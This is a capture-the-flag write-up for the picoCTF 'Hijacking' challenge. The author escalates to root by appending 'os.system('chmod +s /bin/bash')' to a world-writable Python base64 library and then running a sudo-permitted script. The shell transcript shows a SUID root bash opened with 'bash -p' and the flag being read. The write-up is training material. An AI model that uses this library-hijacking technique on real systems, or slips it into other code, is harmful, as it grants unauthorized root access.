# Hijacking

SSH to the server 
```bash
┌──(kali㉿kali)-[~/WriteUp/picoCTF/hijacking]
└─$ ssh picoctf@saturn.picoctf.net -p 58162
....[SNIPPED]....
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoctf@challenge:~$ ls -la 
total 16
drwxr-xr-x 1 picoctf picoctf   20 Mar 12 06:26 .
drwxr-xr-x 1 root    root      21 Aug  4  2023 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Mar 12 06:26 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Feb  7  2024 .server.py
```

There is `.server.py` for chall
```python
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info) 
```

find library from import on the script
```bash
picoctf@challenge:~$ find / -name "base64.py" 2>/dev/null
/usr/lib/python3.8/base64.py
```
checking the permission :
```bash
picoctf@challenge:~$ ls -la /usr/lib/python3.8/ | grep base64
-rwxrwxrwx 1 root root  20382 May 26  2023 base64.py
```
So the file can be modified, let's add a few lines to the `/usr/lib/python3.8/base64.py`

```bash
import os
os.system('chmod +s /bin/bash')
```

```bash
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname

picoctf@challenge:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
picoctf@challenge:~$ /bin/bash -p
bash-5.0# ls -la 
total 20
drwxr-xr-x 1 picoctf picoctf   36 Mar 12 06:35 .
drwxr-xr-x 1 root    root      21 Aug  4  2023 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Mar 12 06:26 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Feb  7  2024 .server.py
-rw------- 1 picoctf picoctf  933 Mar 12 06:35 .viminfo
bash-5.0# cd /root
bash-5.0# ls -la 
total 12
drwx------ 1 root root   23 Sep 26  2024 .
drwxr-xr-x 1 root root   51 Mar 12 06:25 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   43 Sep 26  2024 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
bash-5.0# cat .flag.txt 
picoCTF{Redacted}
```
